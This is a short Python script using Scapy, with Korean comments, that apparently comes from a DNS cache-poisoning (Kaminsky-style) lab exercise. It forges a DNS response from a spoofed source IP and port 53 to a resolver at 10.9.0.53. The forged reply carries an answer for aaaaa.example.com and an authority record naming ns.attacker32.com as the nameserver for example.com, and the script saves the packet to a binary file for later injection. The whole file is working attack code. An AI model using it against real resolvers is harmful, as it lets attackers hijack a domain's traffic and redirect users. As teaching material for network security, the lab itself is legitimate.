from scapy.all import *
# 타겟 이름, 도메인, 공격자 네임서버 설정
targetName = 'aaaaa.example.com'
targetDomain = 'example.com'
attackerNS = 'ns.attacker32.com'
# 목적지 및 출발지 IP 설정
dstIP = '10.9.0.53'
srcIP = '1.2.3.4'
# IP 계층 정의
ip = IP(dst=dstIP, src=srcIP, chksum=0)
# UDP 계층 정의 (출발지 및 목적지 포트 설정)
udp = UDP(dport=33333, sport=53, chksum=0)
# DNS 쿼리 섹션 생성
Qdsec = DNSQR(qname=targetName)
# DNS 응답 섹션 생성 (A 레코드)
Anssec = DNSRR(rrname=targetName, type='A', rdata='1.1.1.1', ttl=259200)
# DNS 권한 섹션 생성 (NS 레코드)
NSsec = DNSRR(rrname=targetDomain, type='NS', rdata=attackerNS, ttl=259200)
# DNS 패킷 헤더 및 전체 구조 정의
dns = DNS(
id=0xAAAA, # 트랜잭션 ID
aa=1, # 권한 있는 응답 플래그
rd=1, # 재귀 요청
qr=1, # 응답 플래그 (1=응답, 0=요청)
qdcount=1, # 쿼리 수
qd=Qdsec, # 쿼리 섹션
ancount=1, # 응답 수
an=Anssec, # 응답 섹션
nscount=1, # 권한 섹션 수
ns=NSsec # 권한 섹션
)
# 최종 패킷 조합 (IP + UDP + DNS)
Replypkt = ip / udp / dns
# 패킷을 바이너리 파일로 저장
with open('ip_resp.bin', 'wb') as f:
f.write(bytes(Replypkt))
